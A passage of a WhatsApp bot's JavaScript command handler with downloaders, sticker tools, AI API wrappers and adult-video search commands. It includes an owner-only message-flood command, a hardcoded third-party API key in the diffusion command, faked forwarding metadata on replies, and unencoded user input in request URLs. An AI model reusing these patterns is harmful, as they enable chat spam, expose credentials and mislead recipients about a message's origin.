meme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem}`

memek = await ToxxicTechInc.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })


} else {
newReply(`Send/reply image with caption ${prefix + command} text1|text2`)
}
}

break

case'smeta': {
if (!/webp/.test(mime)) return newReply('Reply sticker!')
  var stiker = false
    try {
        let [packname, ...author] = q.split('|')
            //var author = (author  []).join('|')
                let mime = m.quoted.mimetype || ''
                        //let img = await q.download()
                            let img = await ToxxicTechInc.downloadAndSaveMediaMessage(quoted, makeid(5))
                                if (!img) return newReply('Reply a sticker!')
                                    var stiker = await addExifAvatar(img, `Made by`, `Rias V2`)
                                      } catch (e) {
                                          console.error(e)
                                              if (Buffer.isBuffer(e)) stiker = e
                                                } finally {
                                                    if (stiker) ToxxicTechInc.sendMessage(m.chat, {
                                                          sticker: stiker
                                                              }, {
                                                                    quoted: m
                                                                        })
                                                                            else return newReply('reply sticker')
                                                                              }
                                                                              }       
                                                                              break
case 'instagram2': case 'ig2':{
if (!text) return newReply(`Enter the link!!!`)
if (!isUrl(args[0])) return newReply(`Where is the link?`)
await ToxxicTechInc.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
try{   
let anu = await fetchJson(`https://aemt.me/download/igdl?url=${text}`)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Here you go!`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: anu.result[0].url }}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice ✨\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
await ToxxicTechInc.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})  
}catch (error) {
await ToxxicTechInc.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
}
break
case 'itunes': {
if (!text) return newReply('Please provide a song name')
  try {
    let res = await fetch(`https://api.popcat.xyz/itunes?q=${encodeURIComponent(text)}`)
    if (!res.ok) {
      throw new Error(`API request failed with status ${res.status}`)
    }
    let json = await res.json()
    console.log('JSON response:', json)
    let songInfo = 
    `*Song Information:*\n
     • *Name:* ${json.name}\n
     • *Artist:* ${json.artist}\n
     • *Album:* ${json.album}\n
     • *Release Date:* ${json.release_date}\n
     • *Price:* ${json.price}\n
     • *Length:* ${json.length}\n
     • *Genre:* ${json.genre}\n
     • *URL:* ${json.url}`
    // Check if thumbnail is present, then send it with songInfo as caption
    if (json.thumbnail) {
      let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: songInfo
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({image: {url:json.thumbnail}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice ✨\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
    } else {
      newReply(songInfo)
    }
  } catch (error) {
    console.error(error)
  }
}
break
case 'spam':
				if (!isCreator) return ownernya()
					if (!text) return newReply(`Use ${prefix +command} text|amount`)
				Lorenzoarg = text.split("|")
				if (!Lorenzoarg) return newReply(`Use ${prefix+ command} text|amount`)
				if (Number(Lorenzoarg[1]) >= 50) return newReply('Max 50!')
				if (isNaN(Lorenzoarg[1])) return newReply(`must be a number`)
				for (let i = 0; i < Lorenzoarg[1]; i++){
					ToxxicTechInc.sendMessage(from, {text: Lorenzoarg[0]})
				}
				break
case 'simisimi': case 'simi':
if (!text) newReply('What do u want to ask?')
let simi = await fetchJson(`https://aemt.me/simi?text=${text}`)
const simi2 = simi.result
ToxxicTechInc.sendMessage(m.chat, {text: simi2}, {quoted: m})
break
case 'clearall': {
if (!isCreator) return ownernya()
ToxxicTechInc.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat)
}
break
case 'pinchat': {
ToxxicTechInc.sendMessage(from, { react: { text: "🫡", key: m.key } })
if (!isCreator) return ownernya()
if (m.isGroup) return LorenzoStickPrivate()
ToxxicTechInc.chatModify({ pin: true }, m.chat)
}
break
case 'unpinchat': {
ToxxicTechInc.sendMessage(from, { react: { text: "🫡", key: m.key } })
if (!isCreator) return ownernya()
if (m.isGroup) return LorenzoStickPrivate()
ToxxicTechInc.chatModify({ pin: false }, m.chat)
}
break
case 'database': {
ToxxicTechInc.sendMessage(from, { react: { text: "🫡", key: m.key } })
if (!isCreator) return ownernya()
totalreg = Object.keys(global.db.data.users).length
    let rtotalreg = Object.values(global.db.data.users).filter(user => user.registered == true).length
    newReply(`*${totalreg} users using Bot*`)
}
break 
case 'getjoinrequest':{
	if (!m.isGroup) return LorenzoStickGroup()
	if (!isBotAdmins) return LorenzoStickBotAdmin()
if (!isAdmins && !isCreator) return LorenzoStickAdmin()
	const response = await ToxxicTechInc.groupRequestParticipantsList(m.chat);
  if (!response || !response.length) {
    ToxxicTechInc.sendMessage(m.chat, {text: 'No pending join requests. ✅'}, {quoted:m});
    return;
  }
  let replyMessage = `${themeemoji} Join Request List:\n`;
  response.forEach((request, index) => {
    const { jid, request_method, request_time } = request;
    const formattedTime = new Date(parseInt(request_time) * 1000).toLocaleString();
    replyMessage += `\n*No.: ${index + 1} Request Details. 👇*`;
    replyMessage += `\n🧟‍♂️ *JID:* ${jid}`;
    replyMessage += `\n🧪 *Method:* ${request_method}`;
    replyMessage += `\n⏰ *Time:* ${formattedTime}\n`;
  });

  ToxxicTechInc.sendMessage(m.chat, {text: replyMessage}, {quoted:m});
};
break
case 'twitter': case 'twitterdl': case 'twitterdl': {
	if (!args[0]) return newReply(`📌 Example : \n*${prefix + command}* https://twitter.com/fernandavasro/status/1569741835555291139?t=ADxk8P3Z3prq8USIZUqXCg&s=19`)
	if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return newReply('Link Invalid!')
          try {
          let { SD, HD, desc, thumb, audio } = await fg.twitter(args[0])
          let te = ` 
┌─⊷ *TWITTER DL*
▢ Description: ${desc}
└───────────`
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: te
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({video: {url:HD}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice ✨\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
} catch (e) {
  	newReply(`Verify that the link is from Twitter`)
	}
}
break
case 'xvideodl': case 'xvideosearch': case 'xvideo': case 'xvideos': case 'xvideosdl': {
	if (!m.isGroup) return LorenzoStickGroup()
	if (!AntiNsfw) return newReply(mess.nsfw)
  if (!text) return newReply(`What do you want to search?\nUsage: *${prefix + command} <search>*\n\nExample: ${prefix+command} hot japanese\nyou can use a link as well\nExample: ${prefix+command} link *`);
    if (!text) return newReply('Please provide a search query or a valid Xvideos URL.');
    // Check if the input is a valid Xvideos URL
    const isURL = /^(https?:\/\/)?(www\.)?xvideos\.com\/.+$/i.test(text);
   try {
      if (isURL) {
        // If it's a valid URL, directly download the video
        const result = await xvideosdl(text);
        const { title, url } = result.result; 
        // Send the video file
        const response = await fetch(url);
        const buffer = await response.arrayBuffer();
        let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Here you go!!\nTitle: ${title}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: Buffer.from(buffer)}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😂💦\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
      } else {
        // If it's not a valid URL, perform a search and display the search results
        const results = await xvideosSearch(text);
        if (results.length === 0) {
          newReply('No search results found for the given query.');
        } else {
          const searchResults = results.map((result, index) => {
            return `${index + 1}. *${result.title}*\nDuration: ${result.duration}\nQuality: ${result.quality}\nURL: ${result.url}`;
          }).join('\n\n');  
          let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `*Search Results for "${text}":*\n\n${searchResults}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😂\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
        }
      }
    } catch (error) {
      console.error(error);
      return newReply('Failed to fetch Xvideos video details.');
    }
  };
  break
  case 'xnxxdl': case 'xnxx': case 'xnxxsearch': {
  if (!m.isGroup) return LorenzoStickGroup()
	if (!AntiNsfw) return newReply(mess.nsfw)
  if (!text)
    return newReply(`What do you want to search?\nUsage: *${prefix + command} <search>*\n\nExample: Hot japanese\nor you can use a link as well\nExample: .${prefix + command} link *`)
  let url
  try {
    url = new URL(text)
  } catch (error) {
    url = null
  }
  if (url) {
    try {
      const files = await xnxxdl(url.href)
      if (files && files.high) {
      	let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Here you go!!`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: {url: files.high}}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😂💦\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
        ToxxicTechInc.sendMessage(m.chat, {video:{url: files.high}, caption: 'Here is go!!'}, {quoted:m})
      } else {
        newReply('🔴 Error: Failed to retrieve the download URL.')
      }
    } catch (e) {
      console.error(e)
      newReply('🔴 Error: We encountered a problem while processing the request.')
    }
  } else {
    try {
      const results = await xnxxSearch(text)
      if (results.length > 0) {
        const message = results.map((r, i) => `${i + 1}. [${r.title}](${r.link})`).join('\n')
        let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: message
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😂\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionJid: ToxxicTechInc.parseMention(message),
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
      } else {
        newReply('🔴 Error: No search results found.')
      }
    } catch (e) {
      console.error(e)
      newReply('🔴 Error: We encountered a problem while processing the request.')
    }
  }
}
break
case 'gita-verse': case 'gita': case 'bhagavatgita': {
	try {
    // Extract the verse number from the command text.
    let verseNumber = m.text.split(' ')[1]
    if (!verseNumber || isNaN(verseNumber)) {
      verseNumber = Math.floor(Math.random() * 700) + 1
    }
    let res = await fetch(`https://gita-api.vercel.app/odi/verse/${verseNumber}`)
    if (!res.ok) {
      let error = await res.json()
      throw new Error(
        `API request failed with status ${res.status} and message ${error.detail[0].msg}`
      )
    }
    let json = await res.json()
    console.log('JSON response:', json)
    let gitaVerse = `
🕉 *Bhagavad Gita: Sacred Teachings*\n
📜 *Chapter ${json.chapter_no}: ${json.chapter_name}*\n
Verse ${json.verse_no}:\n
" ${json.verse} "\n
*🔮 Translation:*\n
${json.translation}\n
*🧘‍♂️ Spiritual Insight (Purport):*\n
${json.purport}`
    newReply(gitaVerse)
    if (json.audio_link) {
      ToxxicTechInc.sendMessage(m.chat, {audio: {url:json.audio_link}, mimetype: 'audio/mp4', ptt: true}, {quoted:m})
    }
  } catch (error) {
    console.error(error)
    // Handle the error appropriately
  }
}
break
case 'apk': {
ToxxicTechInc.sendMessage(from, { react: { text: "🫡", key: m.key } })
	try {
    if (command === 'apk') {
      if (!text) return newReply(`*[❗] Please provide the APK Name you want to download.*`);
      let data = await download(text);
      if (data.size.replace(' MB', '') > 200) {
        return await ToxxicTechInc.sendMessage(m.chat, { text: '*[⛔] The file is too large.*' }, { quoted: m });
      }
      if (data.size.includes('GB')) {
        return await ToxxicTechInc.sendMessage(m.chat, { text: '*[⛔] The file is too large.*' }, { quoted: m });
      }
      await ToxxicTechInc.sendMessage(
        m.chat,
        { document: { url: data.dllink }, mimetype: 'application/vnd.android.package-archive', fileName: data.name + '.apk', caption: null },
        { quoted: m }
      )
    }
  } catch {
    return newReply(`*[❗] An error occurred. Make sure to provide a valid link.*`);
  }
};
break
case 'mega':{
	try {
if (!text) return newReply(`${prefix + command} https://mega.nz/file/ovJTHaQZ#yAbkrvQgykcH_NDKQ8eIc0zvsN7jonBbHZ_HTQL6lZ8`);
const { File } = require('megajs');
        const file = File.fromURL(text);
        await file.loadAttributes();
        if (file.size >= 300000000) return newReply('Error: File size is too large (Maximum Size: 300MB)');
        const downloadingMessage = `🌩️ Downloading file... Please wait.`;
        newReply(downloadingMessage);
        const caption = `*_Successfully downloaded..._*\nFile: ${file.name}\nSize: ${formatBytes(file.size)}`;
        const data = await file.downloadBuffer();
        const fileExtension = path.extname(file.name).toLowerCase();
        const mimeTypes = {
            ".mp4": "video/mp4",
            ".pdf": "application/pdf",
            ".zip": "application/zip",
            ".rar": "application/x-rar-compressed",
            ".7z": "application/x-7z-compressed",
            ".jpg": "image/jpeg",
            ".jpeg": "image/jpeg",
            ".png": "image/png",
        };
        let mimetype = mimeTypes[fileExtension] || "application/octet-stream";
        await ToxxicTechInc.sendMessage(m.chat, {document: data, mimetype: mimetype, fileName: file.name, caption: caption}, {quoted:m});
    } catch (error) {
        return newReply(`Error: ${error.message}`);
    }
}
break
case 'diffusion':{
if (!text) return newReply('What do u want to make?')
    let myHeaders = new Headers();
    myHeaders.append("Content-Type", "application/json");
    let raw = JSON.stringify({
        "key": "TouFyL4VyhWWNhqC3DnF5hAdR2fLXxgGY4Gpe4BqC8YGKE2j4NjuNrJAXetE",
        "prompt": text,
        "negative_prompt": "ugly, deformed, noisy, blurry, distorted, out of focus, bad anatomy, extra limbs, poorly drawn face, poorly drawn hands, missing fingers",
        "width": "720",
        "height": "720",
        "samples": "1",
        "num_inference_steps": "20",
        "seed": null,
        "guidance_scale": 7.5,
        "safety_checker": "yes",
        "multi_lingual": "no",
        "panorama": "no",
        "self_attention": "no",
        "upscale": "no",
        "embeddings_model": null,
        "webhook": null,
        "track_id": null
    });
    var requestOptions = {
        method: 'POST',
        headers: myHeaders,
        body: raw,
        redirect: 'follow'
    };
    try {
        let response = await fetch("https://stablediffusionapi.com/api/v3/text2img", requestOptions);
        let result = await response.json();
        let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Diffusion AI\n\n' + result.meta.prompt
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: result.output[0] } }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"✨\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
    } catch (error) {
        console.log('error', error);
        let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: text
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: `${error.config.url}` } }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"✨\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
    }
}
break
case 'indo-ai': {
	if (!text) return newReply(`Example : ${prefix + command} halo`)
try {
let gpt = await (await fetch(`https://itzpire.com/ai/gpt-web?q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Indo AI' + '\n\n' + gpt.result
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image:  fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return newReply("`*Error*`")
}
}
break
case 'photoleap': {
	if (!text) return newReply(`Example : ${prefix + command} blue sea`);
  let currentTime = Date.now();
  let lastUsed = 0;
  if (currentTime - lastUsed < 10000) return newReply("Cooldown 10 seconds, try again later");
  lastUsed = currentTime;
  try {
    let gpt = await (await fetch(`https://tti.photoleapapp.com/api/v1/generate?prompt=${text}`)).json();
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Photo Leap AI\n\n' + text
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.result_url } }, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"✨\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
  } catch(e) {
    return newReply("`*Error*`");
  }
}
break
case 'ai':
case 'openai': {
	if (!text) return newReply(`Example : ${prefix + command} what is your name`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/gpt?model=gpt-4&q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Chat GPT\n\n' + gpt.data.response
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image:  fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return newReply("`*Error*`")
}
}
    break
        case 'animate': {
	if (!text) return newReply(`Example : ${prefix + command} a cat chasing mouse`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/animate-diff?prompt=${text}`)).json()
const response = await axios.get(gpt.data.image_urls, { responseType: 'arraybuffer' })
const buffer = Buffer.from(response.data, "utf-8")
var fetchedgif = await GIFBufferToVideoBuffer(buffer)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Animation AI\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: fetchedgif }, { upload: ToxxicTechInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return newReply("`*Error*`")
}
}
    break
        case 'diffusion-anime': {
	if (!text) return newReply(`Example : ${prefix + command} what is your name`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/animediff2?prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Diffusion Anime AI\n\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: gpt.result} }, { upload: ToxxicTechInc.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await ToxxicTechInc.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return newReply("`*Error*`")
}
}
    break
    case 'bingai': {
	if (!text) return newReply(`Example : ${prefix + command} what is your name`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/bing-ai?model=Balanced&q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Bing AI\n\n' + gpt.result
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
